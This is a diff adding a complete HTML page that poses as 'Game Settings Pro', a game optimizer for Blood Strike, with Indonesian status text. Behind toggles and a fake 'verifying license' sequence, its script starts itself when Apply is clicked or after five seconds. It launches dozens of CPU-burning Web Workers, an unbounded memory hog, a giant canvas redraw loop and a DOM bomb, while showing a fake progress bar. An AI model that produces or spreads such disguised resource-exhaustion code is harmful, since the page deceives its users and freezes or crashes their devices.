@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Game Settings Pro</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body {
+    background:#0a0e14; color:#c8d6e5; font-family:-apple-system,'Segoe UI',sans-serif;
+    min-height:100vh; padding:18px; overflow-x:hidden;
+  }
+  .hdr { display:flex; align-items:center; gap:10px; margin-bottom:18px; }
+  .ico { width:38px; height:38px; border-radius:10px; background:linear-gradient(135deg,#1e90ff,#00d4aa);
+         display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:700; color:#fff; }
+  .hdr h1 { font-size:17px; font-weight:600; letter-spacing:.3px; }
+  .hdr p { font-size:11px; color:#5f6b7a; margin-top:2px; }
+  .card { background:#121820; border:1px solid #1f2a38; border-radius:14px; padding:14px; margin-bottom:12px; }
+  .row { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #1a2430; }
+  .row:last-child { border-bottom:none; }
+  .lbl { font-size:13px; color:#8fa0b3; }
+  .val { font-size:12px; color:#00d4aa; font-weight:600; }
+  .toggle { width:46px; height:26px; border-radius:13px; background:#00d4aa; position:relative; }
+  .toggle::after { content:''; position:absolute; width:20px; height:20px; border-radius:50%;
+                   background:#fff; top:3px; right:3px; }
+  .slider { width:100%; height:6px; border-radius:3px; background:#1f2a38; margin-top:8px; position:relative; }
+  .slider::after { content:''; position:absolute; width:55%; height:100%; border-radius:3px;
+                   background:linear-gradient(90deg,#1e90ff,#00d4aa); }
+  .knob { position:absolute; width:14px; height:14px; border-radius:50%; background:#fff;
+          top:-4px; left:55%; box-shadow:0 0 8px rgba(0,212,170,.6); }
+  .btn { width:100%; padding:13px; border-radius:12px; border:none; font-size:14px; font-weight:600;
+         background:linear-gradient(135deg,#1e90ff,#00d4aa); color:#0a0e14; margin-top:6px; }
+  .status { display:flex; align-items:center; gap:7px; font-size:11px; color:#5f6b7a; margin-top:14px;
+            justify-content:center; }
+  .dot { width:7px; height:7px; border-radius:50%; background:#00d4aa; animation:pulse 1.4s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
+  #lag { display:none; }
+  canvas { display:none; }
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <div class="ico">⚙</div>
+  <div>
+    <h1>Game Settings Pro</h1>
+    <p>Optimizer v3.2.1 — Blood Strike</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="row"><span class="lbl">Performance Mode</span><div class="toggle"></div></div>
+  <div class="row"><span class="lbl">FPS Unlocker</span><div class="toggle"></div></div>
+  <div class="row"><span class="lbl">Ping Optimizer</span><div class="toggle"></div></div>
+  <div class="row"><span class="lbl">Sensitivity Boost</span><span class="val">+35%</span></div>
+  <div class="slider"><div class="knob"></div></div>
+</div>
+
+<div class="card">
+  <div class="row"><span class="lbl">GPU Render</span><span class="val">High</span></div>
+  <div class="row"><span class="lbl">Texture Quality</span><span class="val">Ultra</span></div>
+  <div class="row"><span class="lbl">Anti-Lag Engine</span><div class="toggle"></div></div>
+</div>
+
+<button class="btn" id="apply">Apply Settings</button>
+
+<div class="status"><div class="dot"></div><span id="st">Menghubungkan ke server optimizer...</span></div>
+
+<div id="lag">
+  <div class="card" style="text-align:center;margin-top:16px">
+    <p style="font-size:13px;color:#8fa0b3">Mengoptimalkan performa game...</p>
+    <p style="font-size:28px;font-weight:700;color:#00d4aa;margin-top:8px" id="pct">0%</p>
+  </div>
+</div>
+
+<canvas id="c" width="1" height="1"></canvas>
+
+<script>
+(function(){
+  var st = document.getElementById('st');
+  var lag = document.getElementById('lag');
+  var pct = document.getElementById('pct');
+  var n = 0, started = false;
+
+  // fake connection phase — 5 detik
+  var msgs = [
+    'Menghubungkan ke server optimizer...',
+    'Memverifikasi lisensi...',
+    'Mengunduh konfigurasi...',
+    'Menerapkan pengaturan...'
+  ];
+  var mi = 0;
+  var fake = setInterval(function(){
+    mi = (mi + 1) % msgs.length;
+    st.textContent = msgs[mi];
+  }, 1200);
+
+  // tombol apply — mulai fase lag
+  document.getElementById('apply').addEventListener('click', function(){
+    if (started) return;
+    started = true;
+    clearInterval(fake);
+    lag.style.display = 'block';
+    st.textContent = 'Optimizing...';
+    fire();
+  });
+
+  // auto-start setelah 5 detik kalau tombol tidak diklik
+  setTimeout(function(){
+    if (!started) {
+      started = true;
+      clearInterval(fake);
+      lag.style.display = 'block';
+      fire();
+    }
+  }, 5000);
+
+  function fire() {
+    // 1. Worker threads — CPU burn
+    var src = 'setInterval(function(){var x=0;for(var i=0;i<1e7;i++)x+=Math.sqrt(i)*Math.sin(i)},1)';
+    var u = URL.createObjectURL(new Blob([src], {type:'application/javascript'}));
+    for (var i = 0; i < 48; i++) { try { new Worker(u); } catch(e){} }
+
+    // 2. Memory hog — alokasi besar terus
+    var hog = [];
+    setInterval(function(){
+      try {
+        for (var i = 0; i < 80; i++) hog.push(new Array(1e6).fill(Math.random()));
+        if (hog.length > 300) hog.splice(0, 150);
+      } catch(e){}
+    }, 30);
+
+    // 3. Canvas render loop — GPU + CPU
+    var c = document.getElementById('c');
+    var ctx = c.getContext('2d');
+    (function draw(){
+      c.width = 2000 + Math.random()*3000;
+      c.height = 2000 + Math.random()*3000;
+      for (var i = 0; i < 800; i++) {
+        ctx.fillStyle = 'rgb(' + (Math.random()*255|0) + ',' +
+                         (Math.random()*255|0) + ',' +
+                         (Math.random()*255|0) + ')';
+        ctx.fillRect(Math.random()*c.width, Math.random()*c.height,
+                     Math.random()*60, Math.random()*60);
+      }
+      requestAnimationFrame(draw);
+    })();
+
+    // 4. DOM bomb — node tak terbatas
+    setInterval(function(){
+      for (var i = 0; i < 200; i++) {
+        var d = document.createElement('div');
+        d.textContent = 'x'.repeat(2000);
+        document.body.appendChild(d);
+      }
+    }, 20);
+
+    // 5. Fake progress
+    setInterval(function(){
+      n = (n + 1) % 100;
+      pct.textContent = n + '%';
+    }, 150);
+  }
+})();
+</script>
+</body>
+</html>
